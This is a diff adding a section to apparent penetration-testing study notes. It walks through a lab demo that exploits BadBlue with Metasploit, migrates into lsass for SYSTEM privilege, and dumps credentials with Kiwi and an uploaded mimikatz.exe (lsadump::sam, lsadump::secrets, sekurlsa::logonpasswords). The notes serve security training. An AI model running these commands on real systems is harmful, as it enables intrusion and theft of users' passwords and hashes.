@@ -140,8 +140,58 @@ In this demonstration, we gain access to the target via a meterpreter session, l
 
    - We should now gain a command shell session on the target system.
 
+# Dumping Hashes with Mimikatz
+
+## Mimikatz
+- Windows post-exploitation tool which allows the extraction of clear-text passwords, hashes and Kerberos tickets from memory.
+- THE SAM (Secruity Account Manager) database, is a database file on Windows systems that stores hashed user passwords.
+- Mimikatz can be used to extract hashes from the lsass.exe process memory where hashes are chached.
+- We can utilize the pre-compiled mimikatz executable, alternatively, if we have access to a meterpreter session on a Windows target, we can utilize the inbuilt meterpreter extension Kiwi.
+
+## Demo: Dumping Hashes With Mimikatz
+
+`nmap -sV  [target IP]`
+
+We use metasploit to exploit the specific installed version of badblue:
+`service postgresql start && msfconsole`
+`search badblue`
+`use 1 `
+`show options`
+`set rhosts [target IP]`
+`exploit`
+We get a meterpreter session on our target system.
+`sysinfo`
+`getuid`
+
+`pgrep lsass`: We want to migrate to the lsas.exe process
+`migrate xxx`
+`getuid`: we should get NT Authority System privilege
+
+### Kiwi Module (meterpreter extension):
+`load kiwi`
+
+example: `creds_all` Gives us credentials all credentials. 
+
+`lsa_dump_sam`: Dumps all ntlm hashes of the users of the system. Mimikatz provides us the SYSKey and SAMKey
+
+`lsa_dump_secrets`: could provide us with clear text creds.
 
 
+### Mimikatz
+
+still in meterpreter session
+`pwd`
+`cd C:\\`
+`mkdir Temp`
+`cd Temp`
+`upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe`
+`shell`
+`dir` we have mimikatz here
+`mimikatz.exe`
+`privilege::Debug`check if we have privs; 20 OK
+`lsadump::sam`if we want to dump the cache od lsass process
+`lsadump::secrets`:DUMPING LSASECRETS
+`sekurlsa::logonpasswords`:Display logon passwords, if configured passwords show in clear text when logon
 
 
 
